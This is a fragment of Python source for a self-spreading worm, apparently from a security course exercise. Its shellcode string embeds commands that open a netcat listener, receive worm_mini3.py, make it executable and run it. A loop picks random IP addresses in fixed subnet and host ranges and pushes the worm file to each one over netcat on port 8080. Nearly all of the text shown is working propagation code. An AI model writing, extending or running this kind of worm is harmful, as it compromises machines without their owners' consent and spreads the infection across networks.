...
shellcode= (
   ...
   " nc -lnv 8080 > worm_mini3.py; chmod +x worm_mini3.py;      " #as per the approach 2, we are adding the pilot code here
   " python3 worm_mini3.py;                                    *"
...
def getNextTarget():
    while True:
        subnet = randint(150, 180) #here we are generating random value between 150-180 subnet value
        host = randint(70, 100) #here we are generating random value between 70-100 host value
...
while True:
    ...
    subprocess.run([f"nc -w5 {targetIP} 8080 < worm_mini3.py"], shell=True) 
